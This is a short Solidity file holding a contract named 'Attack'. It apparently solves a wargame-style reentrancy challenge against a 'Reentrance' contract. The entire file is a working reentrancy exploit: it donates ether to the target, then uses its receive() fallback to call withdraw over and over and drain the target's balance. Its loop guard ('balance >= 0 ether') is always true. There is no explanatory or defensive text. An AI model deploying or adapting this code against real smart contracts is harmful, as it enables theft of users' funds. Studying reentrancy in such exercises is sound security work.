// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack {
    Reentrance reentrance;  

    constructor(address _reentrance) payable {
        reentrance = Reentrance(_reentrance); 
        reentrance.donate{value: msg.value}(address(this));
    }

    receive() external payable {
        if (address(reentrance).balance >= 0 ether) {
            reentrance.withdraw(0.001 ether);
        }
    }

    function attack() public {
        reentrance.withdraw(0.001 ether);
    }
}

interface Reentrance {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}
